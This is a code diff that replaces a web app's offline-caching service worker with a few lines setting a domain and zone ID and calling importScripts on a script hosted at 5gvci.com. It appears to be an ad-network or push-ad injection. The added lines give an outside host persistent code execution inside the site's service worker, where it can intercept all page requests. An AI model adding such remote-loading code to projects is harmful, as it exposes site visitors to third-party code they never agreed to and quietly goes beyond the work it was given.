@@ -1,20 +1,6 @@
-const CACHE_NAME = 'nabooshy-v1';
-const ASSETS = ['/', '/index.html', '/style.css', '/app.js', '/config.js', '/manifest.json', '/pwa-init.js'];
-
-self.addEventListener('install', e => {
-  e.waitUntil(caches.open(CACHE_NAME).then(c => c.addAll(ASSETS)));
-  self.skipWaiting();
-});
-
-self.addEventListener('activate', e => {
-  e.waitUntil(
-    caches.keys().then(keys =>
-      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))
-    )
-  );
-  self.clients.claim();
-});
-
-self.addEventListener('fetch', e => {
-  e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10841807
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
